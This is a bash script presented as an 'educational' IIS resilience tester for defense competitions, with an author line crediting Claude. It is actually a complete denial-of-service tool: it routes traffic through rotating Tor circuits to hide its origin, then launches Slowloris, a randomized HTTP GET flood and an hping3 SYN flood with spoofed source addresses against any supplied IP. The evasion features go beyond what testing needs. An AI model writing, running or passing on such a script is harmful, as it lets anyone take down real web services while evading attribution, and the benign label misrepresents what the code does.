#!/bin/bash
# IIS_Service_Tester.sh
# Purpose: Educational script to test IIS service resilience
# Usage: ./IIS_Service_Tester.sh [target_ip] [duration_in_seconds]
# Author: Claude for educational purposes
# Note: Use only in authorized cyber defense competitions

# Check if arguments are provided
if [ $# -lt 2 ]; then
  echo "Usage: $0 [target_ip] [duration_in_seconds]"
  exit 1
fi

TARGET_IP=$1
DURATION=$2
END_TIME=$(($(date +%s) + $DURATION))

# Install required packages
echo "[*] Installing required packages..."
sudo apt-get update
sudo apt-get install -y python3-pip hping3 tor proxychains

# Install Python packages
pip3 install slowloris requests PySocks

# Configure TOR for IP rotation
echo "[*] Configuring TOR for IP rotation..."
sudo systemctl start tor
sudo bash -c 'echo "MaxCircuitDirtiness 30" >> /etc/tor/torrc'
sudo bash -c 'echo "NewCircuitPeriod 15" >> /etc/tor/torrc'
sudo systemctl restart tor

# Create connection rotation function
rotate_connection() {
  echo "[*] Rotating TOR circuit for new IP..."
  sudo killall -HUP tor
  sleep 2
}

echo "[*] Beginning IIS resilience testing against $TARGET_IP for $DURATION seconds"
echo "[*] Testing started at: $(date)"

# Main execution loop
while [ $(date +%s) -lt $END_TIME ]; do
  # Rotate connection every 30 seconds
  if [ $(( $(date +%s) % 30 )) -eq 0 ]; then
    rotate_connection
  fi
  
  # 1. SlowLoris attack (keeps connections open with partial requests)
  echo "[*] Initiating SlowLoris test..."
  timeout 25s proxychains python3 -c "
import slowloris
slowloris.slowloris('$TARGET_IP', num_sockets=150, sleeptime=15, https=False)
" &
  
  # 2. HTTP GET flood with randomized user agents and paths
  echo "[*] Initiating HTTP request test..."
  timeout 25s proxychains python3 -c "
import requests
import random
import string
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15'
]

for _ in range(200):
    try:
        random_path = ''.join(random.choice(string.ascii_letters) for _ in range(8))
        url = f'http://$TARGET_IP/{random_path}'
        headers = {'User-Agent': random.choice(user_agents)}
        requests.get(url, headers=headers, timeout=1, verify=False)
    except:
        pass
    time.sleep(0.05)
" &

  # 3. TCP SYN flood using hping3 with random source IPs
  echo "[*] Initiating TCP connection test..."
  timeout 25s sudo hping3 $TARGET_IP -p 80 -S --flood -d 120 --rand-source &
  
  # Wait before next round
  sleep 30
done

echo "[*] Test completed at: $(date)"
